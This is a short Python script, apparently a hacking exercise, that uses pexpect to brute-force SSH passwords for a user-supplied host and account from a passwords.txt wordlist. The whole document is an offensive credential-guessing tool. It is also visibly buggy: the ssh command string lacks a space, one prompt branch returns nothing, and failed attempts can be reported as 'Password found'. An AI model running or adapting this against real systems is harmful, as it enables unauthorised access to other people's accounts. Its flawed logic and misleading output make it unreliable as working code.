#!/usr/bin/python
#coding: utf-8

import pexpect

PROMPT = ['#','>>>','>','\$']

def connect(user,host,password):
    ssh_newKey = 'Are you sure you want to continue connecting'
    connStr = 'ssh' + user + '@' + host
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT,ssh_newKey,'[P|p]assword'])

    if ret == 0:
        print('[-] Error Connecting')
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT,'[P|p]assword'])
        if ret == 0:
            print('[-] Error Connecting')
            return
        child.sendline(password)
        child.expect(PROMPT,timeout=0.5)
        return child


def main():
    host = input('Enter Host of target to brute force: ')
    user = input('Enter user account yout want brute forcing: ')
    file = open('passwords.txt', 'r')
    for password in file.readlines():
    	password = password.strip('\n')
    	try:
    		child = connect(user,host,password)
    		print('[+] Password found: ' + password)
    	except:
    		print('[-] Wrong password: ' + password)

if __name__=="__main__":
  main()
